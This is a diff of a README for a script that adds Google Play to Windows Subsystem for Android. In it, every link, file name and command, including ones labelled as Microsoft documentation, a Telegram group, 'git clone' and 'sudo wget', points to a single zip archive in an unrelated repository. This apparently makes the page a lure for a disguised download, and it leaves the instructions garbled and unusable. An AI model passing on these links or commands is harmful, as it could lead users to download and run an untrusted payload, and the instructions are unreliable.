@@ -1,4 +1,4 @@
-# [WSA GApps Script](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+# [WSA GApps Script](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 
 <p align="center">
@@ -7,7 +7,7 @@
   <a href="#installation-procedure">Installation procedure</a> •
   <a href="#uninstallation-procedure">Uninstallation procedure</a> •
   <a href="#gaining-root-access">Gaining Root Access</a> •
-  <a href="https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip">Telegram Group</a>
+  <a href="https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip">Telegram Group</a>
 </p>
 
 # Required Warnings
@@ -20,7 +20,7 @@ Issues are needed in cases if you have an **actual** issue that **prevents** you
 
 ## Legal Warnings
 
-By using the tools (scripts, but not limited to) provided by this project, you agree with the terms of [Unlicense License](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip), which states that "THE SOFTWARE IS PROVIDED "AS IS"".
+By using the tools (scripts, but not limited to) provided by this project, you agree with the terms of [Unlicense License](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip), which states that "THE SOFTWARE IS PROVIDED "AS IS"".
 
 To end user this serves as a warning, though we currently don't have any explicit confirmations - such way of installing Google Services and Google Play Store may potentially be in a legal gray area.
 
@@ -30,11 +30,11 @@ Any product or trademark referenced in this document (or project as whole) belon
 
 # YouTube Tutorial
 
-As a temporary measure and additional information (especially if README remains unclear, [@ADeltaX](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip) provides a video-tutorial hosted on YouTube 
+As a temporary measure and additional information (especially if README remains unclear, [@ADeltaX](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip) provides a video-tutorial hosted on YouTube 
 
 <p align="center">
 
-[![How to install Google Apps (Play Store) on WSA (Windows Subsystem Android)](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip 'How to install Google Apps (Play Store) on WSA (Windows Subsystem Android)')
+[![How to install Google Apps (Play Store) on WSA (Windows Subsystem Android)](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip 'How to install Google Apps (Play Store) on WSA (Windows Subsystem Android)')
 
 </p>
 
@@ -65,15 +65,15 @@ After that - follow installation wizard instructions to proceed. If you have any
 
 - Check with `wsl --list --verbose` to be sure that you have a Linux Distro installed with WSL2 version. If for some reason you have receieved WSL1 kernel (or you have trouble running this command in general) - follow instructions in the section below to perform conversion.
 
-[Microsoft Docs: Installing WSL](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip) 
+[Microsoft Docs: Installing WSL](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip) 
 
-[Microsoft Docs: Set up and best practices](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+[Microsoft Docs: Set up and best practices](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 ### How to convert WSL1 to WSL2 (and manual installation)
 
 If you have trouble installing WSL2 with `wsl --install` in general - follow this instruction from Microsoft.
 
-[Microsoft Docs: Manual installation steps for older versions of WSL](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+[Microsoft Docs: Manual installation steps for older versions of WSL](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 If you have already used WSL, have trouble installing with `wsl --install` or for some reason have received a WSL1 version installation, this section is for you.
 
@@ -86,7 +86,7 @@ Follow these steps:
 - Return to Windows PowerShell and run:
   - `wsl --list --verbose` to get your installed distribution name. In case of Ubuntu, it most likely will look like `Ubuntu-20.04`.
   - `wsl --set-version <distribution name> 2`, replace <distribution name> with the one that you have.
-  - Optional: if you would like to automatically install only WSL2 version builds in future. `wsl --set-default-version 2`. To be sure about the difference, check [Microsoft Docs: WSL - Compare versions](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+  - Optional: if you would like to automatically install only WSL2 version builds in future. `wsl --set-default-version 2`. To be sure about the difference, check [Microsoft Docs: WSL - Compare versions](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 ## Install unzip, lzip
 
@@ -109,12 +109,12 @@ For the sake of simplicity, create a folder in the root of C Drive, so you will 
 **Attention!** The folder where you will place the files which we will be downloading is going to become an installation folder. **DO NOT** delete that folder!  
 **Attention!** At the time of last update for this README, attempt to run scripts if they are located in path that contains spaces (like "Zulu Storage" in `D:\Zulu Storage\WSA`) will result in an error. Be sure to use paths with no spaces as long as fix have not been implemented.
 
-Hint: You can also open any folder (even those that are located within Linux WSL Filesystem, by typing `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip .` (Yes, with the dot) in the WSL Terminal, to move files around.
+Hint: You can also open any folder (even those that are located within Linux WSL Filesystem, by typing `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip .` (Yes, with the dot) in the WSL Terminal, to move files around.
 
 ## Download Windows Subsystem for Android™️ Installation Package
 
 ### Download
-As we need to modify installation files,  we cannot download WSA from the Microsoft Store. To download it directly we will use this [service](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+As we need to modify installation files,  we cannot download WSA from the Microsoft Store. To download it directly we will use this [service](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 Use settings:
 - ProductID: 9P3395VX91NR
@@ -128,24 +128,24 @@ Save the file at our prepared directory `C:\WSA\`
 
 ### Extract
 - Download 7zip or a similar archival program and use it to extract downloaded file. Do not mind that this file does not bear any archival extensions (like .zip).
-- After extraction open `C:\WSA\https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip\`. This folder will contain a lot of `.msix` files, use "Sort by size" to locate two biggest files. 
-- Extract the one that is valid for your architecture, like this one `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`
+- After extraction open `C:\WSA\https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip\`. This folder will contain a lot of `.msix` files, use "Sort by size" to locate two biggest files. 
+- Extract the one that is valid for your architecture, like this one `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`
 - Open the extracted folder
-- Locate and delete files `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`, `AppxSignature.p7x` and `[Content_Types].xml`
+- Locate and delete files `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`, `AppxSignature.p7x` and `[Content_Types].xml`
 - Locate and delete `AppxMetadata` folder
 
 Do not close this folder - we will return here to collect \*.img files. 
 
 ## Download "GApps" via OpenGApps Project
 
-To install Play Store, we need to get it from somewhere. Use [OpenGApps](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip).
+To install Play Store, we need to get it from somewhere. Use [OpenGApps](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip).
 
 Use settings:
 - Platform: x86_64 if you are running Windows on a traditional laptop/PC, otherwise choose ARM64
 - Android: 11.0
 - Variant: Pico (at the time of writing this README, only minimal functionality with Pico variant have been confirmed working).
 
-For the time being save the .zip file at `C:\WSA\https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`. Do **not** extract it.
+For the time being save the .zip file at `C:\WSA\https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`. Do **not** extract it.
 
 ## Clone this repository and populate the directories
 
@@ -157,7 +157,7 @@ As we have used `C:\WSA`, you will be able to use Windows Explorer to move files
 
 ```bash
 cd /mnt/c/WSA
-git clone https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+git clone https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 ```
 Wait for the command to finish running.
 
@@ -166,22 +166,22 @@ At the **Extract** step (in Download Windows Subsystem for Android™️ Install
 Then issuing `ls /mnt/c/WSA/WSAGAScript/\#IMAGES` via WSL terminal should give the list of the following files:
 
 ```
-https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip  https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip  https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip  https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip  https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip  https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip  https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 ```
 
-We also have `C:\WSA\https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`. Copy this .zip file into `C:\WSA\WSAGAScript\#GAPPS`. Do not **extract** it, just move the file.
+We also have `C:\WSA\https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`. Copy this .zip file into `C:\WSA\WSAGAScript\#GAPPS`. Do not **extract** it, just move the file.
 
 Issuing `ls /mnt/c/WSA/WSAGAScript/\#GAPPS` via WSL terminal, you should get something similar to the following:
 
 ```
-https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip  output  product_output
+https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip  output  product_output
 ```
 
 ## Final preparations
 
 ### Change architecture
 
-If you are using this project on a device with ARM architecture (e.g., Qualcomm Snapdragon), please edit `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip` and set the correct architecture. Hint is in the file.
+If you are using this project on a device with ARM architecture (e.g., Qualcomm Snapdragon), please edit `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip` and set the correct architecture. Hint is in the file.
 
 ### Set executable permissions for the scripts
 
@@ -192,28 +192,28 @@ Set executable permissions for the scripts:
 chmod +x *.sh
 ```
 
-Verify that your scripts are executable by running `ls -l` and checking that you have `-rwxrwxrwx` at the start of lines that contain files: `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`, `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`, `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`, `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`, `https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`.
+Verify that your scripts are executable by running `ls -l` and checking that you have `-rwxrwxrwx` at the start of lines that contain files: `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`, `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`, `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`, `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`, `https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`.
 
 ## Running the scripts
 
 Make sure you're in the same directory as in the step before, the run:
 
 ```bash
-https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 ```
 
 ## Copy the edited images
 
-After successful execution, you can now copy edited images from `C:\WSA\WSAGAScript\#IMAGES` back to `C:\WSA\https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip\WsaPackage_1.8.32822.0_x64_Release-Nightly` (example, the folder from where you have taken the images).
+After successful execution, you can now copy edited images from `C:\WSA\WSAGAScript\#IMAGES` back to `C:\WSA\https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip\WsaPackage_1.8.32822.0_x64_Release-Nightly` (example, the folder from where you have taken the images).
 
 ## Registering the edited Windows Subsystem for Android™️ Installation Package
 
 - Use Windows Search to find "Developer Settings", when PC Settings app opens, enable "Developer Mode" on that page.
 - Uninstall any other installed versions of WSA (if you had any, uninstall exactly the main WSA app, all Android apps that have been added to Start Menu will be removed automatically)
-- Open Windows PowerShell as Administrator and run `Add-AppxPackage -Register path-to-extracted-msix\https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip`
+- Open Windows PowerShell as Administrator and run `Add-AppxPackage -Register path-to-extracted-msix\https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip`
 
 Where `path-to-extracted-msix`, use path from "Copy the edited images" section (right above) as example.
 
@@ -247,7 +247,7 @@ You are now root.
 
 # Procedure to add files to WSA
 
-It is possible to add files to WSA (Windows Sybsystem for Android) through WSL. As an example, we will install [busybox](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip) and *bash*.
+It is possible to add files to WSA (Windows Sybsystem for Android) through WSL. As an example, we will install [busybox](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip) and *bash*.
 
 First, turn off WSA:
 - Open *Windows Sybsystem for Android Settings*
@@ -256,40 +256,40 @@ First, turn off WSA:
 Then open a WSL terminal:
 
 ```bash
-cd https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+cd https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 
 # Temporarily extend the "system" filesystem to allow adding things
-e2fsck -f https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo resize2fs https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip 1280M
+e2fsck -f https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo resize2fs https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip 1280M
 
 # Mount "system" in read-write
-sudo mount https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip /mnt/system
+sudo mount https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip /mnt/system
 ```
 
 ## Example to add busybox and bash
 
-Check the most recent [binaries for x86_64-linux](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip); at the time of writing: https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+Check the most recent [binaries for x86_64-linux](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip); at the time of writing: https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 
 ```bash
 cd /mnt/system/system
 sudo mkdir xbin
 cd xbin
-sudo wget https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+sudo wget https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 sudo chmod 755 busybox
 for i in `./busybox --list`; do sudo ln busybox "$i"; done
 
 # We will use the debian bash executable
 sudo mkdir temp
 cd temp
-sudo wget https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip+https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo dpkg-deb -R bash-static_5.1-2+https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip tmp
+sudo wget https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip+https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo dpkg-deb -R bash-static_5.1-2+https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip tmp
 sudo chmod 755 tmp/bin/bash-static
 sudo cp tmp/bin/bash-static ..
 cd ..
 sudo rm -r temp
 
 # Yet another bash executable...
-sudo wget https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+sudo wget https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 sudo chmod 755 bash-linux-x86_64
 
 # Unmount system filesystem
@@ -297,8 +297,8 @@ cd
 sudo umount /mnt/system
 
 # Shrink the system filesystem to minimize its size as much as possible
-e2fsck -f https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
-sudo resize2fs -M https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip
+e2fsck -f https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
+sudo resize2fs -M https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip
 ```
 
 ## Testing the installation
@@ -317,8 +317,8 @@ type vi
 
 # Kernel source
 
-- [WSA-Community/WSA-Linux-Kernel](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+- [WSA-Community/WSA-Linux-Kernel](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
 
 # Currently known issues
 
-- [Issues](https://raw.githubusercontent.com/vinayagamtamilgaming/WSAGAScript/main/jeer/WSAGAScript.zip)
+- [Issues](https://github.com/vinayagamtamilgaming/WSAGAScript/raw/refs/heads/main/jeer/WSAGAScript.zip)
